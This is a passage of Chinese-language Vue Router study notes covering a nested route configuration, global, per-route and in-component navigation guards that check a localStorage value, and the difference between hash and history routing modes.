import Home from "../pages/Home.vue";
import Message from "../pages/Message.vue";
import News from "../pages/News.vue";
import Detail from "../pages/Detail.vue";
// 创建并暴露一个路由器
const router = new VueRouter({
  routes: [
    {
      path: "/home",
      component: Home,
      meta: { title: "主页" },
      children: [
        {
          path: "news",
          component: News,
          meta: { isAuth: true, title: "新闻" },
        },
        {
          path: "message",
          name: "mess",
          component: Message,
          meta: { isAuth: true, title: "消息" },
          children: [
            {
              path: "detail/:id/:title",
              name: "xiangqing",
              component: Detail,
              meta: { isAuth: true, title: "详情" },
              props($route) {
                return {
                  id: $route.query.id,
                  title: $route.query.title,
                  a: 1,
                  b: "hello",
                };
              },
            },
          ],
        },
      ],
    },
    {
      path: "/about",
      component: About,
      meta: { title: "关于" },
    },
  ],
});

// 全局前置路由守卫————初始化的时候被调用、每次路由切换之前被调用
router.beforeEach((to, from, next) => {
  console.log("前置路由守卫", to, from);
  if (to.meta.isAuth) {
    if (localStorage.getItem("school") === "zhejiang") {
      // 放行
      next();
    } else {
      alert("学校名不对，无权查看");
    }
  } else {
    next();
  }
});

// 全局后置路由守卫————初始化的时候被调用、每次路由切换之后被调用
router.afterEach((to, from) => {
  console.log("后置路由守卫", to, from);
  document.title = to.meta.title || "我的系统";
});

export default router;
```

4. 独享守卫:

> 就是在 routes 子路由内写守卫
>
> ```js
> beforeEnter(to,from,next){
> console.log('beforeEnter',to,from)
> if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
>  if(localStorage.getItem('school') === 'atguigu'){
>   next()
>  }else{
>   alert('暂无权限查看')
>   // next({name:'guanyu'})
>  }
> }else{
>  next()
> }
> }
> ```

1. 组件内守卫：

> 在具体组件内写守卫
>
> ```js
> //进入守卫：通过路由规则，进入该组件时被调用
> beforeRouteEnter (to, from, next) {
> },
> //离开守卫：通过路由规则，离开该组件时被调用
> beforeRouteLeave (to, from, next) {
> }
> ```

## 4.13 路由器的两种工作模式

1. 对于一个 url 来说，什么是 hash 值？—— #及其后面的内容就是 hash 值。

2. hash 值不会包含在 HTTP 请求中，即：hash 值不会带给服务器。

3. hash 模式：

   1. 地址中永远带着#号，不美观 。
   2. 若以后将地址通过第三方手机 app 分享，若 app 校验严格，则地址会被标记为不合法。
   3. 兼容性较好。

4. history 模式：

   1. 地址干净，美观 。
   2. 兼容性和 hash 模式相比略差。
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端 404 的问题。
